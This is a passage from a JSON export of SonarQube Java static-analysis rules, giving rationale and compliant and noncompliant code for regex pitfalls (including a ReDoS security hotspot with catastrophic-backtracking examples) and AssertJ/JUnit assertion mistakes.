MyClassTest {\n  @Test\n  void test_equals_and_hash_code() {\n    MyClass obj = new MyClass();\n    assertThat(obj).isEqualTo(obj); // Compliant\n    assertThat(obj).hasSameHashCodeAs(obj); // Compliant\n  }\n}\n</pre>\n\n","impacts":[{"name":"reliability","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-5863","summary":"Assertions should not compare an object to itself","tags":["tests"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"LOGICAL","type":"Bug"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>Why use named groups only to never use any of them later on in the code?</p>\n<p>This rule raises issues every time named groups are:</p>\n<ul>\n  <li> defined but never called anywhere in the code through their name; </li>\n  <li> defined but called elsewhere in the code by their number instead; </li>\n  <li> referenced while not defined. </li>\n</ul>\n<h3>Noncompliant code example</h3>\n<pre>\nString date = \"01/02\";\n\nPattern datePattern = Pattern.compile(\"(?&lt;month&gt;[0-9]{2})/(?&lt;year&gt;[0-9]{2})\");\nMatcher dateMatcher = datePattern.matcher(date);\n\nif (dateMatcher.matches()) {\n  checkValidity(dateMatcher.group(1), dateMatcher.group(2));  // Noncompliant - numbers instead of names of groups are used\n  checkValidity(dateMatcher.group(\"day\")); // Noncompliant - there is no group called \"day\"\n}\n\n// ...\n\nString score = \"14:1\";\n\nPattern scorePattern = Pattern.compile(\"(?&lt;player1&gt;[0-9]+):(?&lt;player2&gt;[0-9]+)\"); // Noncompliant - named groups are never used\nMatcher scoreMatcher = scorePattern.matcher(score);\n\nif (scoreMatcher.matches()) {\n  checkScore(score);\n}\n</pre>\n<h3>Compliant solution</h3>\n<pre>\nString date = \"01/02\";\n\nPattern datePattern = Pattern.compile(\"(?&lt;month&gt;[0-9]{2})/(?&lt;year&gt;[0-9]{2})\");\nMatcher dateMatcher = datePattern.matcher(date);\n\nif (dateMatcher.matches()) {\n  checkValidity(dateMatcher.group(\"month\"), dateMatcher.group(\"year\"));\n}\n\n// ...\n\nString score = \"14:1\";\n\nPattern scorePattern = Pattern.compile(\"(?&lt;player1&gt;[0-9]+):(?&lt;player2&gt;[0-9]+)\");\nMatcher scoreMatcher = scorePattern.matcher(score);\n\nif (scoreMatcher.matches()) {\n  checkScore(scoreMatcher.group(\"player1\"));\n  checkScore(scoreMatcher.group(\"player2\"));\n}\n</pre>\n<p>Or, using dedicated variables instead of group names:</p>\n<pre>\nString score = \"14:1\";\n\nString player = \"([0-9]+)\";\nString gameScore = player + \":\" + player;\n\nPattern scorePattern = Pattern.compile(gameScore);\nMatcher scoreMatcher = scorePattern.matcher(score);\n\nif (scoreMatcher.matches()) {\n  checkScore(score);\n}\n</pre>\n\n","impacts":[{"name":"maintainability","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-5860","summary":"Names of regular expressions named groups should be used","tags":["regex"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"LOGICAL","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Minor","description":"<h2>Why is this an issue?</h2>\n<p>Using reluctant quantifiers (also known as lazy or non-greedy quantifiers) in patterns can often lead to needless backtracking, making the regex\nneedlessly inefficient and potentially vulnerable to <a href=\"https://www.regular-expressions.info/catastrophic.html\">catastrophic backtracking</a>.\nParticularly when using <code>.*?</code> or <code>.+?</code> to match anything up to some terminating character, it is usually a better idea to\ninstead use a greedily or possessively quantified negated character class containing the terminating character. For example <code>&lt;.+?&gt;</code>\nshould be replaced with <code>&lt;[^&gt;]++&gt;</code>.</p>\n<h3>Noncompliant code example</h3>\n<pre>\n&lt;.+?&gt;\n\".*?\"\n</pre>\n<h3>Compliant solution</h3>\n<pre>\n&lt;[^&gt;]++&gt;\n\"[^\"]*+\"\n</pre>\n<p>or</p>\n<pre>\n&lt;[^&gt;]+&gt;\n\"[^\"]*\"\n</pre>\n<h3>Exceptions</h3>\n<p>This rule only applies in cases where the reluctant quantifier can easily be replaced with a negated character class. That means the repetition has\nto be terminated by a single character or character class. Patterns such as the following, where the alternatives without reluctant quantifiers are\nmore complicated, are therefore not subject to this rule:</p>\n<pre>\n&lt;!--.*?--&gt;\n/\\*.*?\\*/\n</pre>\n\n","impacts":[{"name":"maintainability","level":"LOW"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-5857","summary":"Character classes should be preferred over reluctant quantifiers in regular expressions","tags":["regex"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"EFFICIENT","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Critical","description":"<h2>Why is this an issue?</h2>\n<p>Regular expressions have their own syntax that is understood by regular expression engines. Those engines will throw an exception at runtime if\nthey are given a regular expression that does not conform to that syntax.</p>\n<p>To avoid syntax errors, special characters should be escaped with backslashes when they are intended to be matched literally and references to\ncapturing groups should use the correctly spelled name or number of the group.</p>\n<p>To match a literal string instead of a regular expression, either all special characters should be escaped, the <code>Pattern.LITERAL</code> flag\nor methods that donât use regular expressions should be used.</p>\n<h3>Noncompliant code example</h3>\n<pre>\nPattern.compile(\"([\");\nstr.matches(\"([\");\nstr.replaceAll(\"([\", \"{\");\nstr.matches(\"(\\\\w+-(\\\\d+)\");\n</pre>\n<h3>Compliant solution</h3>\n<pre>\nPattern.compile(\"\\\\(\\\\[\");\nPattern.compile(\"([\", Pattern.LITERAL);\nstr.equals(\"([\");\nstr.replace(\"([\", \"{\");\nstr.matches(\"(\\\\w+)-(\\\\d+)\");\n</pre>\n\n","impacts":[{"name":"reliability","level":"HIGH"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-5856","summary":"Regular expressions should be syntactically valid","tags":["regex"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"LOGICAL","type":"Bug"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<p>This rule raises an issue when multiple branches of a regex alternative match the same input.</p>\n<h2>Why is this an issue?</h2>\n<p>If an alternative in a regular expression only matches things that are already matched by another alternative, that alternative is redundant and\nserves no purpose.</p>\n<p>In the best case this means that the offending subpattern is merely redundant and should be removed. In the worst case itâs a sign that this regex\ndoes not match what it was intended to match and should be reworked.</p>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\n\"[ab]|a\"   // Noncompliant: the \"|a\" is redundant because \"[ab]\" already matches \"a\"\n\".*|a\"     // Noncompliant: .* matches everything, so any other alternative is redundant\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\n\"[ab]\"\n\".*\"\n</pre>\n\n","impacts":[{"name":"reliability","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-5855","summary":"Regex alternatives should not be redundant","tags":["regex"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CLEAR","type":"Bug"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>Characters like <code>'eÌ'</code> can be expressed either as a single code point or as a cluster of the letter <code>'e'</code> and a combining\naccent mark. Without the <code>CANON_EQ</code> flag, a regex will only match a string in which the characters are expressed in the same way.</p>\n<h3>Noncompliant code example</h3>\n<pre>\nString s = \"e\\u0300\";\nPattern p = Pattern.compile(\"Ã©|Ã«|Ã¨\"); // Noncompliant\nSystem.out.println(p.matcher(s).replaceAll(\"e\")); // print 'Ã¨'\n</pre>\n<h3>Compliant solution</h3>\n<pre>\nString s = \"e\\u0300\";\nPattern p = Pattern.compile(\"Ã©|Ã«|Ã¨\", Pattern.CANON_EQ);\nSystem.out.println(p.matcher(s).replaceAll(\"e\")); // print 'e'\n</pre>\n\n","impacts":[{"name":"maintainability","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-5854","summary":"Regexes containing characters subject to normalization should use the CANON_EQ flag","tags":["regex"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"COMPLETE","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Minor","description":"<h2>Why is this an issue?</h2>\n<p>AssertJ assertions methods targeting the same object can be chained instead of using multiple <code>assertThat</code>. It avoids duplication and\nincreases the clarity of the code.</p>\n<p>This rule raises an issue when multiples <code>assertThat</code> target the same tested value.</p>\n<h3>Noncompliant code example</h3>\n<pre>\nassertThat(someList).hasSize(3);\nassertThat(someList).contains(\"something\");\n</pre>\n<h3>Compliant solution</h3>\n<pre>\nassertThat(someList)\n  .hasSize(3)\n  .contains(\"something\");\n</pre>\n\n","impacts":[{"name":"maintainability","level":"LOW"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-5853","summary":"Consecutive AssertJ \"assertThat\" statements should be chained","tags":["tests","assertj"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CLEAR","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Critical","description":"<p>Most of the regular expression engines use <code>backtracking</code> to try all possible execution paths of the regular expression when evaluating\nan input, in some cases it can cause performance issues, called <code>catastrophic backtracking</code> situations. In the worst case, the complexity\nof the regular expression is exponential in the size of the input, this means that a small carefully-crafted input (like 20 chars) can trigger\n<code>catastrophic backtracking</code> and cause a denial of service of the application. Super-linear regex complexity can lead to the same impact too\nwith, in this case, a large carefully-crafted input (thousands chars).</p>\n<p>This rule determines the runtime complexity of a regular expression and informs you of the complexity if it is not linear.</p>\n<p>Note that, due to improvements to the matching algorithm, some cases of exponential runtime complexity have become impossible when run using JDK 9\nor later. In such cases, an issue will only be reported if the projectâs target Java version is 8 or earlier.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> The input is user-controlled. </li>\n  <li> The input size is not restricted to a small number of characters. </li>\n  <li> There is no timeout in place to limit the regex evaluation time. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>To avoid <code>catastrophic backtracking</code> situations, make sure that none of the following conditions apply to your regular expression.</p>\n<p>In all of the following cases, catastrophic backtracking can only happen if the problematic part of the regex is followed by a pattern that can\nfail, causing the backtracking to actually happen. Note that when performing a full match (e.g. using <code>String.matches</code>), the end of the\nregex counts as a pattern that can fail because it will only succeed when the end of the string is reached.</p>\n<ul>\n  <li> If you have a non-possessive repetition <code>r*</code> or <code>r*?</code>, such that the regex <code>r</code> could produce different\n  possible matches (of possibly different lengths) on the same input, the worst case matching time can be exponential. This can be the case if\n  <code>r</code> contains optional parts, alternations or additional repetitions (but not if the repetition is written in such a way that thereâs only\n  one way to match it).\n    <ul>\n      <li> When using JDK 9 or later an optimization applies when the repetition is greedy and the entire regex does not contain any back references.\n      In that case the runtime will only be polynomial (in case of nested repetitions) or even linear (in case of alternations or optional parts).\n      </li>\n    </ul>  </li>\n  <li> If you have multiple non-possessive repetitions that can match the same contents and are consecutive or are only separated by an optional\n  separator or a separator that can be matched by both of the repetitions, the worst case matching time can be polynomial (O(n^c) where c is the\n  number of problematic repetitions). For example <code>a*b*</code> is not a problem because <code>a*</code> and <code>b*</code> match different\n  things and <code>a*_a*</code> is not a problem because the repetitions are separated by a <code>'_'</code> and canât match that <code>'_'</code>.\n  However, <code>a*a*</code> and <code>.*_.*</code> have quadratic runtime. </li>\n  <li> If youâre performing a partial match (such as by using <code>Matcher.find</code>, <code>String.split</code>, <code>String.replaceAll</code>\n  etc.) and the regex is not anchored to the beginning of the string, quadratic runtime is especially hard to avoid because whenever a match fails,\n  the regex engine will try again starting at the next index. This means that any unbounded repetition (even a possessive one), if itâs followed by a\n  pattern that can fail, can cause quadratic runtime on some inputs. For example <code>str.split(\"\\\\s*,\")</code> will run in quadratic time on strings\n  that consist entirely of spaces (or at least contain large sequences of spaces, not followed by a comma). </li>\n</ul>\n<p>In order to rewrite your regular expression without these patterns, consider the following strategies:</p>\n<ul>\n  <li> If applicable, define a maximum number of expected repetitions using the bounded quantifiers, like <code>{1,5}</code> instead of <code>+</code>\n  for instance. </li>\n  <li> Refactor <code>nested quantifiers</code> to limit the number of way the inner group can be matched by the outer quantifier, for instance this\n  nested quantifier situation <code>(ba+)+</code> doesnât cause performance issues, indeed, the inner group can be matched only if there exists\n  exactly one <code>b</code> char per repetition of the group. </li>\n  <li> Optimize regular expressions with <code>possessive quantifiers</code> and <code>atomic grouping</code>. </li>\n  <li> Use negated character classes instead of <code>.</code> to exclude separators where applicable. For example the quadratic regex\n  <code>.*_.*</code> can be made linear by changing it to <code>[^_]*_.*</code> </li>\n</ul>\n<p>Sometimes itâs not possible to rewrite the regex to be linear while still matching what you want it to match. Especially when using partial\nmatches, for which it is quite hard to avoid quadratic runtimes. In those cases consider the following approaches:</p>\n<ul>\n  <li> Solve the problem without regular expressions </li>\n  <li> Use an alternative non-backtracking regex implementations such as Googleâs <a href=\"https://github.com/google/re2\">RE2</a> or <a\n  href=\"https://github.com/google/re2j\">RE2/J</a>. </li>\n  <li> Use multiple passes. This could mean pre- and/or post-processing the string manually before/after applying the regular expression to it or\n  using multiple regular expressions. One example of this would be to replace <code>str.split(\"\\\\s*,\\\\s*\")</code> with <code>str.split(\",\")</code> and\n  then trimming the spaces from the strings as a second step. </li>\n  <li> When using <code>Matcher.find()</code>, it is often possible to make the regex infallible by making all the parts that could fail optional,\n  which will prevent backtracking. Of course this means that youâll accept more strings than intended, but this can be handled by using capturing\n  groups to check whether the optional parts were matched or not and then ignoring the match if they werenât. For example the regex <code>x*y</code>\n  could be replaced with <code>x*(y)?</code> and then the call to <code>matcher.find()</code> could be replaced with <code>matcher.find() &amp;&amp;\n  matcher.group(1) != null</code>. </li>\n</ul>\n<h2>Sensitive Code Example</h2>\n<p>The first regex evaluation will never end in <code>JDK</code> &lt;= 9 and the second regex evaluation will never end in any versions of the\n<code>JDK</code>:</p>\n<pre>\njava.util.regex.Pattern.compile(\"(a+)+\").matcher(\n\"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\"+\n\"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\"+\n\"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\"+\n\"aaaaaaaaaaaaaaa!\").matches(); // Sensitive\n\njava.util.regex.Pattern.compile(\"(h|h|ih(((i|a|c|c|a|i|i|j|b|a|i|b|a|a|j))+h)ahbfhba|c|i)*\").matcher(\n\"hchcchicihcchciiicichhcichcihcchiihichiciiiihhcchi\"+\n\"cchhcihchcihiihciichhccciccichcichiihcchcihhicchcciicchcccihiiihhihihihi\"+\n\"chicihhcciccchihhhcchichchciihiicihciihcccciciccicciiiiiiiiicihhhiiiihchccch\"+\n\"chhhhiiihchihcccchhhiiiiiiiicicichicihcciciihichhhhchihciiihhiccccccciciihh\"+\n\"ichiccchhicchicihihccichicciihcichccihhiciccccccccichhhhihihhcchchihih\"+\n\"iihhihihihicichihiiiihhhhihhhchhichiicihhiiiiihchccccchichci\").matches(); // Sensitive\n</pre>\n<h2>Compliant Solution</h2>\n<p>Possessive quantifiers do not keep backtracking positions, thus can be used, if possible, to avoid performance issues:</p>\n<pre>\njava.util.regex.Pattern.compile(\"(a+)++\").matcher(\n\"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\"+\n\"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\"+\n\"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\"+\n\"aaaaaaaaaaaaaaa!\").matches(); // Compliant\n\njava.util.regex.Pattern.compile(\"(h|h|ih(((i|a|c|c|a|i|i|j|b|a|i|b|a|a|j))+h)ahbfhba|c|i)*+\").matcher(\n\"hchcchicihcchciiicichhcichcihcchiihichiciiiihhcchi\"+\n\"cchhcihchcihiihciichhccciccichcichiihcchcihhicchcciicchcccihiiihhihihihi\"+\n\"chicihhcciccchihhhcchichchciihiicihciihcccciciccicciiiiiiiiicihhhiiiihchccch\"+\n\"chhhhiiihchihcccchhhiiiiiiiicicichicihcciciihichhhhchihciiihhiccccccciciihh\"+\n\"ichiccchhicchicihihccichicciihcichccihhiciccccccccichhhhihihhcchchihih\"+\n\"iihhihihihicichihiiiihhhhihhhchhichiicihhiiiiihchccccchichci\").matches(); // Compliant\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A1_2017-Injection\">Top 10 2017 Category A1 - Injection</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/400\">CWE-400 - Uncontrolled Resource Consumption</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/1333\">CWE-1333 - Inefficient Regular Expression Complexity</a> </li>\n  <li> <a href=\"https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS\">owasp.org</a> - OWASP Regular expression Denial\n  of Service - ReDoS </li>\n  <li> <a\n  href=\"https://web.archive.org/web/20220506215733/https://stackstatus.net/post/147710624694/outage-postmortem-july-20-2016\">stackstatus.net(archived)</a> - Outage Postmortem - July 20, 2016 </li>\n  <li> <a href=\"https://www.regular-expressions.info/catastrophic.html\">regular-expressions.info</a> - Runaway Regular Expressions: Catastrophic\n  Backtracking </li>\n  <li> <a\n  href=\"https://docs.microsoft.com/en-us/dotnet/standard/base-types/backtracking-in-regular-expressions#backtracking-with-nested-optional-quantifiers\">docs.microsoft.com</a> - Backtracking with Nested Optional Quantifiers </li>\n</ul>\n\n","impacts":[{"name":"security","level":"HIGH"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-5852","summary":"Using slow regular expressions is security-sensitive","tags":["cwe","regex"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"EFFICIENT","type":"Security Hotspot"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>In regular expressions, anchors (<code>^</code>, <code>$</code>, <code>\\A</code>, <code>\\Z</code> and <code>\\z</code>) have higher precedence than\nthe <code>|</code> operator. So in a regular expression like <code>^alt1|alt2|alt3$</code>, <code>alt1</code> would be anchored to the beginning,\n<code>alt3</code> to the end and <code>alt2</code> wouldnât be anchored at all. Usually the intended behavior is that all alternatives are anchored at\nboth ends. To achieve this, a non-capturing group should be used around the alternatives.</p>\n<p>In cases where it is intended that the anchors only apply to one alternative each, adding (non-capturing) groups around the anchors and the parts\nthat they apply to will make it explicit which parts are anchored and avoid readers misunderstanding the precedence or changing it because they\nmistakenly assume the precedence was not intended.</p>\n<h3>Noncompliant code example</h3>\n<pre>\n^a|b|c$\n</pre>\n<h3>Compliant solution</h3>\n<pre>\n^(?:a|b|c)$\n</pre>\n<p>or</p>\n<pre>\n^a$|^b$|^c$\n</pre>\n<p>or, if you do want the anchors to only apply to <code>a</code> and <code>c</code> respectively:</p>\n<pre>\n(?:^a)|b|(?:c$)\n</pre>\n\n","impacts":[{"name":"reliability","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-5850","summary":"Alternatives in regular expressions should be grouped when used with anchors","tags":["regex"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CLEAR","type":"Bug"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Critical","description":"<h2>Why is this an issue?</h2>\n<p>One way to test for empty lines is to use the regex <code>\"^$\"</code>, which can be extremely handy when filtering out empty lines from collections\nof Strings, for instance. With regard to this, the Javadoc for <a\nhref=\"https://docs.oracle.com/en/java/javase/11/docs/api/java.base/java/util/regex/Pattern.html\">Pattern (Line Terminators)</a> states the\nfollowing:</p>\n<blockquote>\n  <p>By default, the regular expressions ^ and <code>$</code> ignore line terminators and only match at the beginning and the end, respectively, of\n  the entire input sequence. If <code>MULTILINE</code> mode is activated then ^ matches at the beginning of input and after any line terminator\n  <strong>except at the end of input</strong>. When in <code>MULTILINE</code> mode <code>$</code> matches just before a line terminator or the end of\n  the input sequence.</p>\n</blockquote>\n<p>As emphasized, ^ is not going to match at the end of an input, and the end of the input is necessarily included in the empty string, which might\nlead to completely missing empty lines, while it would be the initial reason for using such regex.</p>\n<p>Therefore, when searching for empty lines using a multi-line regular expression, you should also check whether the string is empty.</p>\n<p>This rule is raising an issue every time a pattern that can match the empty string is used with <code>MULTILINE</code> flag and without calling\n<code>isEmpty()</code> on the string.</p>\n<h3>Noncompliant code example</h3>\n<pre>\nstatic final Pattern p = Pattern.compile(\"^$\", Pattern.MULTILINE); // Noncompliant\n\n// Alternatively\nstatic final Pattern p = Pattern.compile(\"(?m)^$\"); // Noncompliant\n\n\nboolean containsEmptyLines(String str) {\n    return p.matcher(str).find();\n}\n\n// ...\nSystem.out.println(containsEmptyLines(\"a\\n\\nb\")); // correctly prints 'true'\nSystem.out.println(containsEmptyLines(\"\")); // incorrectly prints 'false'\n</pre>\n<h3>Compliant solution</h3>\n<pre>\nstatic final Pattern p = Pattern.compile(\"^$\", Pattern.MULTILINE);\n\nboolean containsEmptyLines(String str) {\n    return p.matcher(str).find() || str.isEmpty();\n}\n\n// ...\nSystem.out.println(containsEmptyLines(\"a\\n\\nb\")); // correctly prints 'true'\nSystem.out.println(containsEmptyLines(\"\")); // also correctly prints 'true'\n</pre>\n\n","impacts":[{"name":"maintainability","level":"HIGH"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-5846","summary":"Empty lines should not be tested with regex MULTILINE flag","tags":["regex"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"LOGICAL","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Critical","description":"<h2>Why is this an issue?</h2>\n<p>Assertions comparing incompatible types always fail, and negative assertions always pass. At best, negative assertions are useless. At worst, the\ndeveloper loses time trying to fix his code logic before noticing wrong assertions.</p>\n<p>Dissimilar types are:</p>\n<ul>\n  <li> comparing a primitive with null </li>\n  <li> comparing an object with an unrelated primitive (E.G. a string with an int) </li>\n  <li> comparing unrelated classes </li>\n  <li> comparing an array to a non-array </li>\n  <li> comparing two arrays of dissimilar types </li>\n</ul>\n<p>This rule also raises issues for unrelated <code>class</code> and <code>interface</code> or unrelated <code>interface</code> types in negative\nassertions. Because except in some corner cases, those types are more likely to be dissimilar. And inside a negative assertion, there is no test\nfailure to inform the developer about this unusual comparison.</p>\n<p>Supported test frameworks:</p>\n<ul>\n  <li> JUnit4 </li>\n  <li> JUnit5 </li>\n  <li> AssertJ </li>\n</ul>\n<h3>Noncompliant code example</h3>\n<pre>\ninterface KitchenTool {}\ninterface Plant {}\nclass Spatula implements KitchenTool {}\nclass Tree implements Plant {}\n\nvoid assertValues(int size,\n                  Spatula spatula, KitchenTool tool,  KitchenTool[] tools,\n                  Tree    tree,    Plant       plant, Tree[]        trees) {\n\n  // Whatever the given values, those negative assertions will always pass due to dissimilar types:\n  assertThat(size).isNotNull();           // Noncompliant; primitives can not be null\n  assertThat(spatula).isNotEqualTo(tree); // Noncompliant; unrelated classes\n  assertThat(tool).isNotSameAs(tools);    // Noncompliant; array &amp; non-array\n  assertThat(trees).isNotEqualTo(tools);  // Noncompliant; incompatible arrays\n\n  // Those assertions will always fail\n  assertThat(size).isNull();                       // Noncompliant\n  assertThat(spatula).isEqualTo(tree);             // Noncompliant\n\n  // Those negative assertions are more likely to always pass\n  assertThat(spatula).isNotEqualTo(plant); // Noncompliant; unrelated class and interface\n  assertThat(tool).isNotEqualTo(plant);    // Noncompliant; unrelated interfaces\n}\n</pre>\n<h2>Resources</h2>\n<ul>\n  <li> {rule:java:S2159} - Silly equality checks should not be made </li>\n</ul>\n\n","impacts":[{"name":"reliability","level":"HIGH"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-5845","summary":"Assertions comparing incompatible types should not be made","tags":["tests"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"LOGICAL","type":"Bug"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>Overly complicated regular expressions are hard to read and to maintain and can easily cause hard-to-find bugs. If a regex is too complicated, you\nshould consider replacing it or parts of it with regular code or splitting it apart into multiple patterns at least.</p>\n<p>The complexity of a regular expression is determined as follows:</p>\n<p>Each of the following operators increases the complexity by an amount equal to the current nesting level and also increases the current nesting\nlevel by one for its arguments:</p>\n<ul>\n  <li> <code>|</code> - when multiple <code>|</code> operators are used together, the subsequent ones only increase the complexity by 1 </li>\n  <li> <code>&amp;&amp;</code> (inside character classes) - when multiple <code>&amp;&amp;</code> operators are used together, the subsequent ones\n  only increase the complexity by 1 </li>\n  <li> Quantifiers (<code>*</code>, <code>+</code>, <code>?</code>, <code>{n,m}</code>, <code>{n,}</code> or <code>{n}</code>) </li>\n  <li> Non-capturing groups that set flags (such as <code>(?i:some_pattern)</code> or <code>(?i)some_pattern</code>) </li>\n  <li> Lookahead and lookbehind assertions </li>\n</ul>\n<p>Additionally, each use of the following features increase the complexity by 1 regardless of nesting:</p>\n<ul>\n  <li> character classes </li>\n  <li> back references </li>\n</ul>\n<p>If a regular expression is split among multiple variables, the complexity is calculated for each variable individually, not for the whole regular\nexpression. If a regular expression is split over multiple lines, each line is treated individually if it is accompanied by a comment (either a Java\ncomment or a comment within the regular expression), otherwise the regular expression is analyzed as a whole.</p>\n<h3>Noncompliant code example</h3>\n<pre>\nif (dateString.matches(\"^(?:(?:31(\\\\/|-|\\\\.)(?:0?[13578]|1[02]))\\\\1|(?:(?:29|30)(\\\\/|-|\\\\.)(?:0?[13-9]|1[0-2])\\\\2))(?:(?:1[6-9]|[2-9]\\\\d)?\\\\d{2})$|^(?:29(\\\\/|-|\\\\.)0?2\\\\3(?:(?:(?:1[6-9]|[2-9]\\\\d)?(?:0[48]|[2468][048]|[13579][26])|(?:(?:16|[2468][048]|[3579][26])00))))$|^(?:0?[1-9]|1\\\\d|2[0-8])(\\\\/|-|\\\\.)(?:(?:0?[1-9])|(?:1[0-2]))\\\\4(?:(?:1[6-9]|[2-9]\\\\d)?\\\\d{2})$\")) {\n    handleDate(dateString);\n}\n</pre>\n<h3>Compliant solution</h3>\n<pre>\nif (dateString.matches(\"^\\\\d{1,2}([-/.])\\\\d{1,2}\\\\1\\\\d{1,4}$\")) {\n    String dateParts[] = dateString.split(\"[-/.]\");\n    int day = Integer.parseInt(dateParts[0]);\n    int month = Integer.parseInt(dateParts[1]);\n    int year = Integer.parseInt(dateParts[2]);\n    // Put logic to validate and process the date based on its integer parts here\n}\n</pre>\n<h3>Exceptions</h3>\n<p>Regular expressions are only analyzed if all parts of the regular expression are either string literals, effectively final local variables or\n<code>static final</code> fields, all of which can be combined using the '<code>+</code>' operator.</p>\n<p>When a regular expression is split among multiple variables or commented lines, each part is only analyzed if it is syntactically valid by\nitself.</p>\n\n","impacts":[{"name":"maintainability","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-5843","summary":"Regular expressions should not be too complicated","tags":["regex"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CLEAR","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Minor","description":"<h2>Why is this an issue?</h2>\n<p>A regex should never include a repetitive pattern whose body would match the empty string. This is usually a sign that a part of the regex is\nredundant or does not do what the author intended.</p>\n<h3>Noncompliant code example</h3>\n<pre>\n\"(?:)*\"      // same as the empty regex, the '*' accomplishes nothing\n\"(?:|x)*\"    // same as the empty regex, the alternative has no effect\n\"(?:x|)*\"    // same as 'x*', the empty alternative has no effect\n\"(?:x*|y*)*\" // same as 'x*', the first alternative would always match, y* is never tried\n\"(?:x?)*\"    // same as 'x*'\n\"(?:x?)+\"    // same as 'x*'\n</pre>\n<h3>Compliant solution</h3>\n<pre>\n\"x*\"\n</pre>\n\n","impacts":[{"name":"reliability","level":"LOW"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-5842","summary":"Repeated patterns in regular expressions should not match the empty string","tags":["regex"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"LOGICAL","type":"Bug"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Minor","description":"<h2>Why is this an issue?</h2>\n<p>AssertJ assertions <code>allMatch</code> and <code>doesNotContains</code> on an empty list always&nbsp;returns true whatever the content of the\npredicate. Despite being correct, you should make explicit if you expect an empty list or not, by adding\n<code>isEmpty()</code>/<code>isNotEmpty()</code> in addition to calling the assertion, or by testing the listâs content further. It will justify the\nuseless predicate to improve clarity or increase the reliability of the test.</p>\n<p>This rule raises an 